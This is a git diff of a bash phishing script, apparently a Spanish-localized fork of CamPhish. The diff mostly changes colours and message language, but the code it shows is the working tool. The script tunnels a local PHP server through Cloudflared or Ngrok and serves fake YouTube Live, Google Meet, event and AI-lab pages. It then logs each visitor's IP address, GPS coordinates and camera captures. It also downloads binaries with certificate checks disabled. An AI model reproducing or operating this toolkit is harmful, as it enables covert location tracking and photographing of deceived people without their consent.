@@ -30,15 +30,15 @@ trap 'printf "\n";stop' 2
 
 banner() {
 clear
-printf "\e[1;32m   _____   ___   ______  \e[1;31m ______  __ __  ______  \e[0m\n"
-printf "\e[1;32m  / ___/  /   | /_  __/  \e[1;31m/_  __/ / // / /_  __/  \e[0m\n"
-printf "\e[1;32m  \__ \  / /| |  / /     \e[1;31m / /   / // /_  / /     \e[1;0m\n"
-printf "\e[1;32m ___/ / / ___ | / /      \e[1;31m/ /   /__  __/ / /      \e[1;31m\e[5m[SYSTEM ONLINE]\e[0m\n"
-printf "\e[1;32m/____/ /_/  |_|/_/       \e[1;31m/_/      /_/   /_/       \e[0m\n"
+printf "\e[1;38;2;0;181;0m   _____   ___   ______  \e[1;31m ______  __ __  ______  \e[0m\n"
+printf "\e[1;38;2;0;181;0m  / ___/  /   | /_  __/  \e[1;31m/_  __/ / // / /_  __/  \e[0m\n"
+printf "\e[1;38;2;0;181;0m  \__ \  / /| |  / /     \e[1;31m / /   / // /_  / /     \e[1;0m\n"
+printf "\e[1;38;2;0;181;0m ___/ / / ___ | / /      \e[1;31m/ /   /__  __/ / /      \e[1;31m\e[5m[SYSTEM ONLINE]\e[0m\n"
+printf "\e[1;38;2;0;181;0m/____/ /_/  |_|/_/       \e[1;31m/_/      /_/   /_/       \e[0m\n"
 printf "\n"
-printf "\e[1;92m  [ Security Awareness Toolkit ]\e[1;37m Version: \e[1;31m10.1.0\e[0m\n"
-printf "\e[1;92m  [ GitHub ]\e[1;77m https://github.com/jesusdorian999019/SecurityAwarenessToolkit.git\e[0m\n"
-printf "\e[1;92m  [ Original Creator ]\e[1;77m TechChip (techchip.net)\e[0m\n"
+printf "\e[1;38;2;0;181;0m  [ Security Awareness Toolkit ]\e[1;37m Version: \e[1;31m10.1.0\e[0m\n"
+printf "\e[1;38;2;0;181;0m  [ GitHub ]\e[1;77m https://github.com/jesusdorian999019/SecurityAwarenessToolkit.git\e[0m\n"
+printf "\e[1;38;2;0;181;0m  [ Original Creator ]\e[1;77m TechChip (techchip.net)\e[0m\n"
 printf "\e[1;31m  ----------------------------------------------------------------------\e[0m\n"
 printf "\n"
 }
@@ -80,7 +80,7 @@ exit 1
 catch_ip() {
 ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
 IFS=$'\n'
-printf "\e[1;32m[\e[1;37m+\e[1;32m] IP DE DETECTADA:\e[0m\e[1;77m %s\e[0m\n" $ip
+printf "\e[1;38;2;0;181;0m[\e[1;37m+\e[1;38;2;0;181;0m] IP DETECTADA:\e[0m\e[1;77m %s\e[0m\n" $ip
 
 cat ip.txt >> saved.ip.txt
 }
@@ -96,10 +96,10 @@ catch_location() {
     maps_link=$(grep -a 'Google Maps:' "$location_file" | cut -d " " -f3 | tr -d '\r')
     
     # Only display essential location data
-    printf "\e[1;32m[\e[1;37m+\e[1;32m] Latitud:\e[0m\e[1;77m %s\e[0m\n" $lat
-    printf "\e[1;32m[\e[1;37m+\e[1;32m] Longitud:\e[0m\e[1;77m %s\e[0m\n" $lon
-    printf "\e[1;32m[\e[1;37m+\e[1;32m] Precision:\e[0m\e[1;77m %s metros\e[0m\n" $acc
-    printf "\e[1;32m[\e[1;37m+\e[1;32m] Google Maps:\e[0m\e[1;77m %s\e[0m\n" $maps_link
+    printf "\e[1;38;2;0;181;0m[\e[1;37m+\e[1;38;2;0;181;0m] Latitud:\e[0m\e[1;77m %s\e[0m\n" $lat
+    printf "\e[1;38;2;0;181;0m[\e[1;37m+\e[1;38;2;0;181;0m] Longitud:\e[0m\e[1;77m %s\e[0m\n" $lon
+    printf "\e[1;38;2;0;181;0m[\e[1;37m+\e[1;38;2;0;181;0m] Precision:\e[0m\e[1;77m %s metros\e[0m\n" $acc
+    printf "\e[1;38;2;0;181;0m[\e[1;37m+\e[1;38;2;0;181;0m] Google Maps:\e[0m\e[1;77m %s\e[0m\n" $maps_link
     
     # Create directory for saved locations if it doesn't exist
     if [[ ! -d "saved_locations" ]]; then
@@ -107,7 +107,7 @@ catch_location() {
     fi
     
     mv "$location_file" saved_locations/
-    printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Location saved to saved_locations/%s\e[0m\n" "$location_file"
+    printf "\e[1;38;2;0;181;0m[\e[1;37m*\e[1;38;2;0;181;0m] Reporte guardado en: saved_locations/%s\e[0m\n" "$location_file"
   done
 
   # Clean up triggers and temporary files
@@ -123,8 +123,8 @@ if [[ ! -d "saved_locations" ]]; then
 fi
 
 printf "\n"
-printf "\e[1;32m[\e[1;37m*\e[1;32m] Esperando conexiones entrantes...\e[0m\e[1;77m (Ctrl + C para salir)\e[0m\n"
-printf "\e[1;32m[\e[1;37m*\e[1;32m] Rastreo GPS Hibrido: \e[1;31mACTIVO\e[0m\n"
+printf "\e[1;38;2;0;181;0m[\e[1;37m*\e[1;38;2;0;181;0m] Esperando conexiones entrantes...\e[0m\e[1;77m (Ctrl + C para salir)\e[0m\n"
+printf "\e[1;38;2;0;181;0m[\e[1;37m*\e[1;38;2;0;181;0m] Rastreo GPS Hibrido: \e[1;31mACTIVO\e[0m\n"
 while [ true ]; do
 
 if [[ -e "ip.txt" ]]; then
@@ -137,7 +137,7 @@ sleep 0.5
 
 # Combined check for any location indicator
 if [[ -e "LocationLog.log" || -e "current_location.txt" || -n $(ls location_*.txt 2>/dev/null) ]]; then
-printf "\n\e[1;32m[\e[1;37m+\e[1;32m] DATOS DE UBICACION SINCRONIZADOS\e[0m\n"
+printf "\n\e[1;38;2;0;181;0m[\e[1;37m+\e[1;38;2;0;181;0m] DATOS DE UBICACION SINCRONIZADOS\e[0m\n"
 # Don't display the raw log content, just process it
 catch_location
 fi
@@ -149,7 +149,7 @@ rm -rf LocationError.log
 fi
 
 if [[ -e "Log.log" ]]; then
-printf "\n\e[1;32m[\e[1;37m+\e[1;32m] CAPTURA MULTIMEDIA RECIBIDA\e[0m\n"
+printf "\n\e[1;38;2;0;181;0m[\e[1;37m+\e[1;38;2;0;181;0m] CAPTURA MULTIMEDIA RECIBIDA\e[0m\n"
 rm -rf Log.log
 fi
 sleep 0.5
@@ -163,7 +163,7 @@ echo ""
 else
 command -v unzip > /dev/null 2>&1 || { echo >&2 "I require unzip but it's not installed. Install it. Aborting."; exit 1; }
 command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Aborting."; exit 1; }
-printf "\e[1;92m[\e[0m+\e[1;92m] Downloading Cloudflared...\n"
+printf "\e[1;38;2;0;181;0m[\e[1;37m+\e[1;38;2;0;181;0m] Descargando Cloudflared...\n"
 
 # Detect architecture
 arch=$(uname -m)
@@ -172,7 +172,7 @@ printf "\e[1;92m[\e[0m+\e[1;92m] Detected OS: $os, Architecture: $arch\n"
 
 # Windows detection
 if [[ "$windows_mode" == true ]]; then
-    printf "\e[1;92m[\e[0m+\e[1;92m] Windows detected, downloading Windows binary...\n"
+    printf "\e[1;38;2;0;181;0m[\e[1;37m+\e[1;38;2;0;181;0m] Windows detectado, descargando binario...\n"
     wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe -O cloudflared.exe > /dev/null 2>&1
     if [[ -e cloudflared.exe ]]; then
         chmod +x cloudflared.exe
@@ -188,12 +188,12 @@ else
     # Non-Windows systems
     # macOS detection
     if [[ "$os" == "Darwin" ]]; then
-        printf "\e[1;92m[\e[0m+\e[1;92m] macOS detected...\n"
+        printf "\e[1;38;2;0;181;0m[\e[1;37m+\e[1;38;2;0;181;0m] macOS detectado...\n"
         if [[ "$arch" == "arm64" ]]; then
-            printf "\e[1;92m[\e[0m+\e[1;92m] Apple Silicon (M1/M2/M3) detected...\n"
+            printf "\e[1;38;2;0;181;0m[\e[1;37m+\e[1;38;2;0;181;0m] Apple Silicon (M1/M2/M3) detectado...\n"
             wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-darwin-arm64.tgz -O cloudflared.tgz > /dev/null 2>&1
         else
-            printf "\e[1;92m[\e[0m+\e[1;92m] Intel Mac detected...\n"
+            printf "\e[1;38;2;0;181;0m[\e[1;37m+\e[1;38;2;0;181;0m] Intel Mac detectado...\n"
             wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-darwin-amd64.tgz -O cloudflared.tgz > /dev/null 2>&1
         fi
         
@@ -209,23 +209,23 @@ else
     else
         case "$arch" in
             "x86_64")
-                printf "\e[1;92m[\e[0m+\e[1;92m] x86_64 architecture detected...\n"
+                printf "\e[1;38;2;0;181;0m[\e[1;37m+\e[1;38;2;0;181;0m] x86_64 detectado...\n"
                 wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -O cloudflared > /dev/null 2>&1
                 ;;
             "i686"|"i386")
-                printf "\e[1;92m[\e[0m+\e[1;92m] x86 32-bit architecture detected...\n"
+                printf "\e[1;38;2;0;181;0m[\e[1;37m+\e[1;38;2;0;181;0m] x86 32-bit detectado...\n"
                 wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386 -O cloudflared > /dev/null 2>&1
                 ;;
             "aarch64"|"arm64")
-                printf "\e[1;92m[\e[0m+\e[1;92m] ARM64 architecture detected...\n"
+                printf "\e[1;38;2;0;181;0m[\e[1;37m+\e[1;38;2;0;181;0m] ARM64 detectado...\n"
                 wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64 -O cloudflared > /dev/null 2>&1
                 ;;
             "armv7l"|"armv6l"|"arm")
-                printf "\e[1;92m[\e[0m+\e[1;92m] ARM architecture detected...\n"
+                printf "\e[1;38;2;0;181;0m[\e[1;37m+\e[1;38;2;0;181;0m] ARM detectado...\n"
                 wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm -O cloudflared > /dev/null 2>&1
                 ;;
             *)
-                printf "\e[1;92m[\e[0m+\e[1;92m] Architecture not specifically detected ($arch), defaulting to amd64...\n"
+                printf "\e[1;38;2;0;181;0m[\e[1;37m+\e[1;38;2;0;181;0m] Arquitectura no detectada ($arch), usando amd64...\n"
                 wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -O cloudflared > /dev/null 2>&1
                 ;;
         esac
@@ -250,10 +250,10 @@ else
     pkill -9 cloudflared > /dev/null 2>&1
 fi
 
-printf "\e[1;32m[\e[1;37m+\e[1;32m] Levantando servidor PHP local...\n"
+printf "\e[1;38;2;0;181;0m[\e[1;37m+\e[1;38;2;0;181;0m] Levantando servidor PHP local...\n"
 php -S 127.0.0.1:3333 > php_server.log 2>&1 & 
 sleep 5
-printf "\e[1;92m[\e[0m+\e[1;92m] Starting cloudflared tunnel...\n"
+printf "\e[1;38;2;0;181;0m[\e[1;37m+\e[1;38;2;0;181;0m] Iniciando tunel Cloudflared...\n"
 rm -rf .cloudflared_output.log > /dev/null 2>&1
 
 if [[ "$windows_mode" == true ]]; then
@@ -275,15 +275,15 @@ done
 
 if [[ -z "$link" ]]; then
 printf "\e[1;31m[!] Direct link is not generating, check following possible reason  \e[0m\n"
-printf "\e[1;32m[\e[1;31m*\e[1;32m] \e[1;31m El servicio de CloudFlare podria estar caido\n"
-printf "\e[1;32m[\e[1;31m*\e[1;32m] \e[1;31m Si estas en Android, activa el Hotspot\n"
-printf "\e[1;32m[\e[1;31m*\e[1;32m] \e[1;31m CloudFlared ya esta corriendo (usa killall cloudflared)\n"
-printf "\e[1;32m[\e[1;31m*\e[1;32m] \e[1;31m Verifica tu conexion a internet\n"
-printf "\e[1;32m[\e[1;31m*\e[1;32m] \e[1;31m Ejecucion manual: ./cloudflared tunnel --url http://127.0.0.1:3333\n"
-printf "\e[1;32m[\e[1;31m*\e[1;32m] \e[1;31m En Windows: cloudflared.exe tunnel --url http://127.0.0.1:3333\n"
+printf "\e[1;38;2;0;181;0m[\e[1;31m*\e[1;38;2;0;181;0m] \e[1;31m El servicio de CloudFlare podria estar caido\n"
+printf "\e[1;38;2;0;181;0m[\e[1;31m*\e[1;38;2;0;181;0m] \e[1;31m Si estas en Android, activa el Hotspot\n"
+printf "\e[1;38;2;0;181;0m[\e[1;31m*\e[1;38;2;0;181;0m] \e[1;31m CloudFlared ya esta corriendo (usa killall cloudflared)\n"
+printf "\e[1;38;2;0;181;0m[\e[1;31m*\e[1;38;2;0;181;0m] \e[1;31m Verifica tu conexion a internet\n"
+printf "\e[1;38;2;0;181;0m[\e[1;31m*\e[1;38;2;0;181;0m] \e[1;31m Ejecucion manual: ./cloudflared tunnel --url http://127.0.0.1:3333\n"
+printf "\e[1;38;2;0;181;0m[\e[1;31m*\e[1;38;2;0;181;0m] \e[1;31m En Windows: cloudflared.exe tunnel --url http://127.0.0.1:3333\n"
 exit 1
 else
-printf "\e[1;32m[\e[1;31m*\e[1;32m] LINK GENERADO:\e[0m\e[1;77m %s\e[0m\n" $link
+printf "\e[1;38;2;0;181;0m[\e[1;31m*\e[1;38;2;0;181;0m] LINK GENERADO:\e[0m\e[1;77m %s\e[0m\n" $link
 fi
 payload_cloudflare
 checkfound
@@ -313,7 +313,7 @@ echo ""
 else
 command -v unzip > /dev/null 2>&1 || { echo >&2 "I require unzip but it's not installed. Install it. Aborting."; exit 1; }
 command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Aborting."; exit 1; }
-printf "\e[1;92m[\e[0m+\e[1;92m] Downloading Ngrok...\n"
+printf "\e[1;38;2;0;181;0m[\e[1;37m+\e[1;38;2;0;181;0m] Descargando Ngrok...\n"
 
 # Detect architecture
 arch=$(uname -m)
@@ -394,39 +394,39 @@ if [[ "$windows_mode" == true ]]; then
     if [[ -e "$USERPROFILE\.ngrok2\ngrok.yml" ]]; then
         printf "\e[1;93m[\e[0m*\e[1;93m] your ngrok "
         cat "$USERPROFILE\.ngrok2\ngrok.yml"
-        read -p $'\n\e[1;92m[\e[0m+\e[1;92m] Do you want to change your ngrok authtoken? [Y/n]:\e[0m ' chg_token
+        read -p $'\n\e[1;38;2;0;181;0m[\e[1;37m+\e[1;38;2;0;181;0m] ¿Quieres cambiar tu authtoken? [Y/n]:\e[0m ' chg_token
         if [[ $chg_token == "Y" || $chg_token == "y" || $chg_token == "Yes" || $chg_token == "yes" ]]; then
-            read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter your valid ngrok authtoken: \e[0m' ngrok_auth
+            read -p $'\e[1;38;2;0;181;0m[\e[1;37m+\e[1;38;2;0;181;0m] Ingresa tu Ngrok Authtoken: \e[0m' ngrok_auth
             ./ngrok.exe authtoken $ngrok_auth >  /dev/null 2>&1 &
-            printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93mAuthtoken has been changed\n"
+            printf "\e[1;38;2;0;181;0m[\e[1;37m*\e[1;38;2;0;181;0m] Token actualizado correctamente\n"
         fi
     else
-        read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter your valid ngrok authtoken: \e[0m' ngrok_auth
+        read -p $'\e[1;38;2;0;181;0m[\e[1;37m+\e[1;38;2;0;181;0m] Ingresa tu Ngrok Authtoken: \e[0m' ngrok_auth
         ./ngrok.exe authtoken $ngrok_auth >  /dev/null 2>&1 &
     fi
-    printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server...\n"
+    printf "\e[1;38;2;0;181;0m[\e[1;37m+\e[1;38;2;0;181;0m] Levantando servidor PHP local...\n"
     php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
     sleep 5
-    printf "\e[1;92m[\e[0m+\e[1;92m] Starting ngrok server...\n"
+    printf "\e[1;38;2;0;181;0m[\e[1;37m+\e[1;38;2;0;181;0m] Iniciando servidor Ngrok...\n"
     ./ngrok.exe http 127.0.0.1:3333 > /dev/null 2>&1 &
 else
     if [[ -e ~/.ngrok2/ngrok.yml ]]; then
         printf "\e[1;93m[\e[0m*\e[1;93m] your ngrok "
         cat  ~/.ngrok2/ngrok.yml
-        read -p $'\n\e[1;92m[\e[0m+\e[1;92m] Do you want to change your ngrok authtoken? [Y/n]:\e[0m ' chg_token
+        read -p $'\n\e[1;38;2;0;181;0m[\e[1;37m+\e[1;38;2;0;181;0m] ¿Quieres cambiar tu authtoken? [Y/n]:\e[0m ' chg_token
         if [[ $chg_token == "Y" || $chg_token == "y" || $chg_token == "Yes" || $chg_token == "yes" ]]; then
-            read -p $'\e[1;32m[\e[1;37m+\e[1;32m] Ingresa tu Ngrok Authtoken: \e[0m' ngrok_auth
+            read -p $'\e[1;38;2;0;181;0m[\e[1;37m+\e[1;38;2;0;181;0m] Ingresa tu Ngrok Authtoken: \e[0m' ngrok_auth
             ./ngrok authtoken $ngrok_auth >  /dev/null 2>&1 &
-            printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93mAuthtoken has been changed\n"
+            printf "\e[1;38;2;0;181;0m[\e[1;37m*\e[1;38;2;0;181;0m] Token actualizado correctamente\n"
         fi
     else
-        read -p $'\e[1;32m[\e[1;37m+\e[1;32m] Ingresa tu Ngrok Authtoken: \e[0m' ngrok_auth
+        read -p $'\e[1;38;2;0;181;0m[\e[1;37m+\e[1;38;2;0;181;0m] Ingresa tu Ngrok Authtoken: \e[0m' ngrok_auth
         ./ngrok authtoken $ngrok_auth >  /dev/null 2>&1 &
     fi
-    printf "\e[1;32m[\e[1;37m+\e[1;32m] Levantando servidor PHP local...\n"
+    printf "\e[1;38;2;0;181;0m[\e[1;37m+\e[1;38;2;0;181;0m] Levantando servidor PHP local...\n"
     php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
     sleep 5
-    printf "\e[1;92m[\e[0m+\e[1;92m] Starting ngrok server...\n"
+    printf "\e[1;38;2;0;181;0m[\e[1;37m+\e[1;38;2;0;181;0m] Iniciando servidor Ngrok...\n"
     ./ngrok http 127.0.0.1:3333 > /dev/null 2>&1 &
 fi
 
@@ -435,14 +435,14 @@ sleep 10
 link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -oE 'https://[-0-9a-zA-Z.]+ngrok-free.app' | head -n1)
 if [[ -z "$link" ]]; then
 printf "\e[1;31m[!] Direct link is not generating, check following possible reason  \e[0m\n"
-printf "\e[1;32m[\e[1;31m*\e[1;32m] \e[1;31m El Authtoken de Ngrok es invalido\n"
-printf "\e[1;32m[\e[1;31m*\e[1;32m] \e[1;31m Si estas en Android, activa el Hotspot\n"
-printf "\e[1;32m[\e[1;31m*\e[1;32m] \e[1;31m Ngrok ya esta corriendo (usa killall ngrok)\n"
-printf "\e[1;32m[\e[1;31m*\e[1;32m] \e[1;31m Verifica tu conexion a internet\n"
-printf "\e[1;32m[\e[1;31m*\e[1;32m] \e[1;31m Ejecucion manual: ./ngrok http 3333\n"
+printf "\e[1;38;2;0;181;0m[\e[1;31m*\e[1;38;2;0;181;0m] \e[1;31m El Authtoken de Ngrok es invalido\n"
+printf "\e[1;38;2;0;181;0m[\e[1;31m*\e[1;38;2;0;181;0m] \e[1;31m Si estas en Android, activa el Hotspot\n"
+printf "\e[1;38;2;0;181;0m[\e[1;31m*\e[1;38;2;0;181;0m] \e[1;31m Ngrok ya esta corriendo (usa killall ngrok)\n"
+printf "\e[1;38;2;0;181;0m[\e[1;31m*\e[1;38;2;0;181;0m] \e[1;31m Verifica tu conexion a internet\n"
+printf "\e[1;38;2;0;181;0m[\e[1;31m*\e[1;38;2;0;181;0m] \e[1;31m Ejecucion manual: ./ngrok http 3333\n"
 exit 1
 else
-printf "\e[1;32m[\e[1;31m*\e[1;32m] LINK GENERADO:\e[0m\e[1;77m %s\e[0m\n" $link
+printf "\e[1;38;2;0;181;0m[\e[1;31m*\e[1;38;2;0;181;0m] LINK GENERADO:\e[0m\e[1;77m %s\e[0m\n" $link
 fi
 payload_ngrok
 checkfound
@@ -466,25 +466,25 @@ rm -rf index3.html
 }
 
 update_tool() {
-printf "\e[1;92m[\e[0m+\e[1;92m] Checking for updates...\n"
+printf "\e[1;38;2;0;181;0m[\e[1;37m+\e[1;38;2;0;181;0m] Buscando actualizaciones...\n"
 if [[ -d .git ]]; then
     command -v git > /dev/null 2>&1 || { echo >&2 "I require git but it's not installed. Aborting."; exit 1; }
-    printf "\e[1;92m[\e[0m+\e[1;92m] Fetching latest version from GitHub...\n"
+    printf "\e[1;38;2;0;181;0m[\e[1;37m+\e[1;38;2;0;181;0m] Sincronizando con GitHub...\n"
     git fetch
     LOCAL=$(git rev-parse @)
     REMOTE=$(git rev-parse @{u})
     BASE=$(git merge-base @ @{u})
 
     if [ "$LOCAL" = "$REMOTE" ]; then
-        printf "\e[1;92m[\e[0m+\e[1;92m] Tool is up to date.\n"
+        printf "\e[1;38;2;0;181;0m[\e[1;37m+\e[1;38;2;0;181;0m] El sistema está actualizado.\n"
         sleep 2
         clear
         banner
         camphish
     elif [ "$LOCAL" = "$BASE" ]; then
-        printf "\e[1;93m[\e[0m!\e[1;93m] New version available! Updating...\n"
+        printf "\e[1;31m[\e[1;37m!\e[1;31m] Nueva version detectada. Descargando...\n"
         git pull
-        printf "\e[1;92m[\e[0m+\e[1;92m] Update successful. Please restart the tool.\n"
+        printf "\e[1;38;2;0;181;0m[\e[1;37m+\e[1;38;2;0;181;0m] Actualización completada con éxito.\n"
         exit 0
     else
         printf "\e[1;93m[\e[0m!\e[1;93m] Local changes detected. Please update manually.\n"
@@ -494,12 +494,12 @@ if [[ -d .git ]]; then
         camphish
     fi
 else
-    printf "\e[1;93m[\e[0m!\e[1;93m] Not a git repository. Downloading main script...\n"
+    printf "\e[1;31m[\e[1;37m!\e[1;31m] No se detectó repositorio Git. Descargando script...\n"
     wget --no-check-certificate https://raw.githubusercontent.com/jesusdorian999019/CamPhish-master-v-YISUS/master/camphish.sh -O camphish.sh.new > /dev/null 2>&1
     if [[ -e camphish.sh.new ]]; then
         mv camphish.sh.new camphish.sh
         chmod +x camphish.sh
-        printf "\e[1;92m[\e[0m+\e[1;92m] Script updated successfully. Please restart the tool.\n"
+        printf "\e[1;38;2;0;181;0m[\e[1;37m+\e[1;38;2;0;181;0m] Script actualizado. Reinicia el toolkit.\n"
         exit 0
     else
         printf "\e[1;31m[!] Update failed. Check your internet connection.\e[0m\n"
@@ -517,11 +517,11 @@ rm -rf sendlink
 fi
 
 printf "\n-----Choose an option----\n"    
-printf "\n\e[1;32m[\e[1;37m01\e[1;32m]\e[0m\e[1;32m Ngrok Secure Tunnel\e[0m\n"
-printf "\e[1;32m[\e[1;37m02\e[1;32m]\e[0m\e[1;32m CloudFlare Tunnel (Recomendado)\e[0m\n"
-printf "\e[1;32m[\e[1;37m03\e[1;32m]\e[0m\e[1;32m Buscar Actualizaciones del Sistema\e[0m\n"
+printf "\n\e[1;38;2;0;181;0m[\e[1;37m01\e[1;38;2;0;181;0m]\e[0m\e[1;38;2;0;181;0m Ngrok Secure Tunnel\e[0m\n"
+printf "\e[1;38;2;0;181;0m[\e[1;37m02\e[1;38;2;0;181;0m]\e[0m\e[1;38;2;0;181;0m CloudFlare Tunnel (Recomendado)\e[0m\n"
+printf "\e[1;38;2;0;181;0m[\e[1;37m03\e[1;38;2;0;181;0m]\e[0m\e[1;38;2;0;181;0m Buscar Actualizaciones del Sistema\e[0m\n"
 default_option_server="2"
-read -p $'\n\e[1;32m[\e[1;37m+\e[1;32m] Selecciona un metodo: \e[0m' option_server
+read -p $'\n\e[1;38;2;0;181;0m[\e[1;37m+\e[1;38;2;0;181;0m] Selecciona un metodo: \e[0m' option_server
 option_server="${option_server:-${default_option_server}}"
 
 if [[ $option_server -eq 3 ]]; then
@@ -543,22 +543,22 @@ fi
 
 select_template() {
 printf "\n-----Choose a template----\n"    
-printf "\n\e[1;32m[\e[1;37m01\e[1;32m]\e[0m\e[1;32m Portal de Eventos (Personalizable)\e[0m\n"
-printf "\e[1;32m[\e[1;37m02\e[1;32m]\e[0m\e[1;32m Panel de YouTube Live\e[0m\n"
-printf "\e[1;32m[\e[1;37m03\e[1;32m]\e[0m\e[1;32m Simulacion de Google Meet\e[0m\n"
-printf "\e[1;32m[\e[1;37m04\e[1;32m]\e[0m\e[1;32m Laboratorio IA (Nano Banana)\e[0m\n"
+printf "\n\e[1;38;2;0;181;0m[\e[1;37m01\e[1;38;2;0;181;0m]\e[0m\e[1;38;2;0;181;0m Portal de Eventos (Personalizable)\e[0m\n"
+printf "\e[1;38;2;0;181;0m[\e[1;37m02\e[1;38;2;0;181;0m]\e[0m\e[1;38;2;0;181;0m Panel de YouTube Live\e[0m\n"
+printf "\e[1;38;2;0;181;0m[\e[1;37m03\e[1;38;2;0;181;0m]\e[0m\e[1;38;2;0;181;0m Simulacion de Google Meet\e[0m\n"
+printf "\e[1;38;2;0;181;0m[\e[1;37m04\e[1;38;2;0;181;0m]\e[0m\e[1;38;2;0;181;0m Laboratorio IA (Nano Banana)\e[0m\n"
 default_option_template="1"
-read -p $'\n\e[1;32m[\e[1;37m+\e[1;32m] Selecciona una interfaz: \e[0m' option_tem
+read -p $'\n\e[1;38;2;0;181;0m[\e[1;37m+\e[1;38;2;0;181;0m] Selecciona una interfaz: \e[0m' option_tem
 option_tem="${option_tem:-${default_option_template}}"
 if [[ $option_tem -eq 1 ]]; then
-read -p $'\n\e[1;32m[\e[1;37m+\e[1;32m] Nombre del evento: \e[0m' fest_name
+read -p $'\n\e[1;38;2;0;181;0m[\e[1;37m+\e[1;38;2;0;181;0m] Nombre del evento: \e[0m' fest_name
 fest_name="${fest_name//[[:space:]]/}"
 elif [[ $option_tem -eq 2 ]]; then
-read -p $'\n\e[1;32m[\e[1;37m+\e[1;32m] ID del Video de YouTube: \e[0m' yt_video_ID
+read -p $'\n\e[1;38;2;0;181;0m[\e[1;37m+\e[1;38;2;0;181;0m] ID del Video de YouTube: \e[0m' yt_video_ID
 elif [[ $option_tem -eq 3 ]]; then
-printf "\e[1;32m[\e[1;37m+\e[1;32m] Plantilla Google Meet configurada.\n"
+printf "\e[1;38;2;0;181;0m[\e[1;37m+\e[1;38;2;0;181;0m] Plantilla Google Meet configurada.\n"
 elif [[ $option_tem -eq 4 ]]; then
-printf "\e[1;32m[\e[1;37m+\e[1;32m] Interfaz de IA Nano Banana configurada.\n"
+printf "\e[1;38;2;0;181;0m[\e[1;37m+\e[1;38;2;0;181;0m] Interfaz de IA Nano Banana configurada.\n"
 else
 printf "\e[1;93m [!] Invalid template option! try again\e[0m\n"
 sleep 1
